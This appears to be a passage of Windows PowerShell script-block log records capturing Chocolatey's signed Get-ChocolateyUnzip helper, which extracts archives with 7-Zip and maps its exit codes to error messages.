[System.Diagnostics.ProcessWindowStyle]::Hidden $process.StartInfo.CreateNoWindow = $true $process.Start() | Out-Null if ($process.StartInfo.RedirectStandardOutput) { $process.BeginOutputReadLine() } if ($process.StartInfo.RedirectStandardError) { $process.BeginErrorReadLine() } $process.WaitForExit() # For some reason this forces the jobs to finish and waits for # them to do so. Without this it never finishes. Unregister-Event -SourceIdentifier ""LogOutput_ChocolateyZipProc"" Unregister-Event -SourceIdentifier ""LogErrors_ChocolateyZipProc"" # sometimes the process hasn't fully exited yet. for ($loopCount=1; $loopCount -le 15; $loopCount++) { if ($process.HasExited) { break; } Write-Debug ""Waiting for 7z.exe process to exit - $loopCount/15 seconds""; Start-Sleep 1; } $exitCode = $process.ExitCode $process.Dispose() Set-PowerShellExitCode $exitCode Write-Debug ""Command ['$7zip' $params] exited with `'$exitCode`'."" if ($zipExtractLogFullPath) { Set-Content $zipExtractLogFullPath $global:zipFileList.ToString() -Encoding UTF8 -Force } Write-Debug ""7z exit code: $exitCode"" $errorMessageAddendum = "" This is most likely an issue with the '$env:chocolateyPackageName' package and not with Chocolatey itself. Please follow up with the package maintainer(s) directly."" switch ($exitCode) { 0 { break } 1 { throw 'Some files could not be extracted.' + $errorMessageAddendum } # this one is returned e.g. for access denied errors 2 { throw '7-Zip encountered a fatal error while extracting the files.' + $errorMessageAddendum } 7 { throw ('7-Zip command line error.' + $errorMessageAddendum) } 8 { throw '7-Zip out of memory.' + $errorMessageAddendum } 255 { throw 'Extraction cancelled by the user.' + $errorMessageAddendum } default { throw ""7-Zip signalled an unknown error (code $exitCode)"" + $errorMessageAddendum} } $env:ChocolateyPackageInstallLocation = $destination return $destination } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCDl7UF34Z4O7bJl # J2k4Fq6w3RZugnxsmdjzMLvixJbal6CCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUx","MessageNumber: 1 ¦ MessageTotal: 2 ¦ Path: C:\ProgramData\chocolatey\helpers\functions\Get-ChocolateyUnzip.ps1 ¦ ScriptBlockId: 33eb1f4e-529c-4805-afac-35d0be6847f0 ¦ ScriptBlockText: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Get-ChocolateyUnzip { <# .SYNOPSIS Unzips an archive file and returns the location for further processing. .DESCRIPTION This unzips files using the 7-zip command line tool 7z.exe. Supported archive formats are listed at: https://sevenzip.osdn.jp/chm/general/formats.htm Prior to 0.9.10.1, 7za.exe was used. Supported archive formats for 7za.exe are: 7z, lzma, cab, zip, gzip, bzip2, and tar. .INPUTS None .OUTPUTS Returns the passed in $destination. .NOTES If extraction fails, an exception is thrown. If you are embedding files into a package, ensure that you have the rights to redistribute those files if you are sharing this package publicly (like on the community feed). Otherwise, please use Install-ChocolateyZipPackage to download those resources from their official distribution points. Starting in 0.9.10, will automatically call Set-PowerShellExitCode to set the package exit code based on 7-zip's exit code. .PARAMETER FileFullPath This is the full path to the zip file. If embedding it in the package next to the install script, the path will be like `""$(Split-Path -Parent $MyInvocation.MyCommand.Definition)\\file.zip""` In 0.10.1+, `File` is an alias for FileFullPath. This can be a 32-bit or 64-bit file. This is mandatory in earlier versions of Chocolatey, but optional if FileFullPath64 has been provided. .PARAMETER FileFullPath64 Full file path to a 64-bit native installer to run. Available in 0.10.4+. If embedding in the package, you can get it to the path with `""$(Split-Path -parent $MyInvocation.MyCommand.Definition)\\INSTALLER_FILE""` Provide this when you want to provide both 32-bit and 64-bit installers or explicitly only a 64-bit installer (which will cause a package install failure on 32-bit systems). .PARAMETER Destination This is a directory where you would like the unzipped files to end up. If it does not exist, it will be created. .PARAMETER SpecificFolder OPTIONAL - This is a specific directory within zip file to extract. .PARAMETER PackageName OPTIONAL - This will faciliate logging unzip activity for subsequent uninstalls .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE > # Path to the folder where the script is executing $toolsDir = (Split-Path -parent $MyInvocation.MyCommand.Definition) Get-ChocolateyUnzip -FileFullPath ""c:\someFile.zip"" -Destination $toolsDir .LINK Install-ChocolateyZipPackage #> param( [alias(""file"")][parameter(Mandatory=$false, Position=0)][string] $fileFullPath, [parameter(Mandatory=$true, Position=1)][string] $destination, [parameter(Mandatory=$false, Position=2)][string] $specificFolder, [parameter(Mandatory=$false, Position=3)][string] $packageName, [alias(""file64"")][parameter(Mandatory=$false)][string] $fileFullPath64, [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters $bitnessMessage = '' $zipfileFullPath=$fileFullPath if ((Get-ProcessorBits 32) -or $env:ChocolateyForceX86 -eq 'true') { if (!$fileFullPath) { throw ""32-bit archive is not supported for $packageName""; } if ($fileFullPath64) { $bitnessMessage = '32-bit '; } } elseif ($fileFullPath64) { $zipfileFullPath = $fileFullPath64 $bitnessMessage = '64-bit ' } if ($zipfileFullPath -eq '' -or $zipfileFullPath -eq $null) { throw 'Package parameters incorrect, either FileFullPath or FileFullPath64 must be specified.' } if ($packageName) { $packagelibPath = $env:ChocolateyPackageFolder if (!(Test-Path -path $packagelibPath)) { New-Item $packagelibPath -type directory } $zipFilename=split-path $zipfileFullPath -Leaf $zipExtractLogFullPath= Join-Path $packagelibPath $zipFilename`.txt } if ($env:chocolateyPackageName -ne $null -and $env:chocolateyPackageName -eq $env:ChocolateyInstallDirectoryPackage) { Write-Warning ""Install Directory override not available for zip packages at this time.`n If this package also runs a native installer using Chocolatey`n functions, the directory will be honored."" } Write-Host ""Extracting $bitnessMessage$zipfileFullPath to $destination..."" if (![System.IO.Directory]::Exists($destination)) { [System.IO.Directory]::CreateDirectory($destination) | Out-Null } $7zip = Join-Path ""$helpersPath"" '..\tools\7z.exe' if (!([System.IO.File]::Exists($7zip))) { Update-SessionEnvironment $7zip = Join-Path ""$env:ChocolateyInstall"" 'tools\7z.exe' } $7zip = [System.IO.Path]::GetFullPath($7zip) Write-Debug ""7zip found at `'$7zip`'"" # 32-bit 7z would not find C:\Windows\System32\config\systemprofile\AppData\Local\Temp, # because it gets translated to C:\Windows\SysWOW64\... by the WOW redirection layer. # Replace System32 with sysnative, which does not get redirected. # 32-bit 7z is required so it can see both architectures if ([IntPtr]::Size -ne 4) { $fileFullPathNoRedirection = $zipfileFullPath -ireplace ([System.Text.RegularExpressions.Regex]::Escape([Environment]::GetFolderPath('System'))),(Join-Path $Env:SystemRoot 'SysNative') $destinationNoRedirection = $destination -ireplace ([System.Text.RegularExpressions.Regex]::Escape([Environment]::GetFolderPath('System'))),(Join-Path $Env:SystemRoot 'SysNative') } else { $fileFullPathNoRedirection = $zipfileFullPath $destinationNoRedirection = $destination } $params = ""x -aoa -bd -bb1 -o`""$destinationNoRedirection`"" -y `""$fileFullPathNoRedirection`"""" if ($specificfolder) { $params += "" `""$specificfolder`"""" } Write-Debug ""Executing command ['$7zip' $params]"" # Capture 7z's output into a StringBuilder and write it out in blocks, to improve I/O performance. $global:zipFileList = New-Object System.Text.StringBuilder $global:zipDestinationFolder = $destination # Redirecting output slows things down a bit. $writeOutput = { if ($EventArgs.Data -ne $null) { $line = $EventArgs.Data Write-Verbose ""$line"" if ($line.StartsWith(""- "")) { $global:zipFileList.AppendLine($global:zipDestinationFolder + ""\"" + $line.Substring(2)) } } } $writeError = { if ($EventArgs.Data -ne $null) { Write-Error ""$($EventArgs.Data)"" } } $process = New-Object System.Diagnostics.Process $process.EnableRaisingEvents = $true Register-ObjectEvent -InputObject $process -SourceIdentifier ""LogOutput_ChocolateyZipProc"" -EventName OutputDataReceived -Action $writeOutput | Out-Null Register-ObjectEvent -InputObject $process -SourceIdentifier ""LogErrors_ChocolateyZipProc"" -EventName ErrorDataReceived -Action $writeError | Out-Null $process.StartInfo = new-object System.Diagnostics.ProcessStartInfo($7zip, $params) $process.StartInfo.RedirectStandardOutput = $true $process.StartInfo.RedirectStandardError = $true $process.StartInfo.UseShellExecute = $false $process.StartInfo.WorkingDirectory = Get-Location $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden $process.StartInfo.CreateNoWindow = $true $process.Start() | Out-Null if ($process.StartInfo.RedirectStandardOutput) { $process.BeginOutputReadLine() } if ($process.StartInfo.RedirectStandardError) { $process.BeginErrorReadLine() } $process.WaitForExit() # For some reason this forces the jobs to finish and waits for # them to do so. Without this it never finishes. Unregister-Event -SourceIdentifier ""LogOutput_ChocolateyZipProc"" Unregister-Event -SourceIdentifier ""LogErrors_ChocolateyZipProc"" # sometimes the process hasn't fully exited yet. for ($loopCount=1; $loopCount -le 15; $loopCount++) { if ($process.HasExited) { break; } Write-Debug ""Waiting for 7z.exe process to exit - $loopCount/15 seconds""; Start-Sleep 1; } $exitCode = $process.ExitCode $process.Dispose() Set-PowerShellExitCode $exitCode Write-Debug ""Command ['$7zip' $params] exited with `'$exitCode`'."" if ($zipExtractLogFullPath) { Set-Content $zipExtractLogFullPath $global:zipFileList.ToString() -Encoding UTF8 -Force } Write-Debug ""7z exit code: $exitCode"" $errorMessageAddendum = "" This is most likely an issue with the '$env:chocolateyPackageName' package and not with Chocolatey itself. Please follow up with the package maintainer(s) directly."" switch ($exitCode) { 0 { break } 1 { throw 'Some files could not be extracted.' + $errorMessageAddendum } # this one is returned e.g. for access denied errors 2 { throw '7-Zip encountered a fatal error while extracting the files.' + $errorMessageAddendum } 7 { throw ('7-Zip command line error.' + $errorMessageAddendum) } 8 { throw '7-Zip out of memory.' + $errorMessageAddendum } 255 { throw 'Extraction cancelled by the user.' + $errorMessageAddendum } default { throw ""7-Zip signalled an unknown error (code $exitCode)"" + $errorMessageAddendum} } $env:ChocolateyPackageInstallLocation = $destination return $destination } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCDl7UF34Z4O7bJl # J2k4Fq6w3RZugnxsmdjzMLvixJbal6CCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # 